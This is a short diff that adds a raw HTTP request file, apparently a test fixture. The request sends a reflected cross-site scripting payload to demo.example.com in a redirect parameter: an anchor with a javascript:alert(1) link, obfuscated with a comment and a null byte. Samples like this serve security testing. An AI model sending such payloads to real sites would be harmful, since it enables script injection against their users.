@@ -1,0 +1,4 @@
+GET /a?redirect=</*%00*/a%20href%3D"javascript:alert(1)">x</a> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
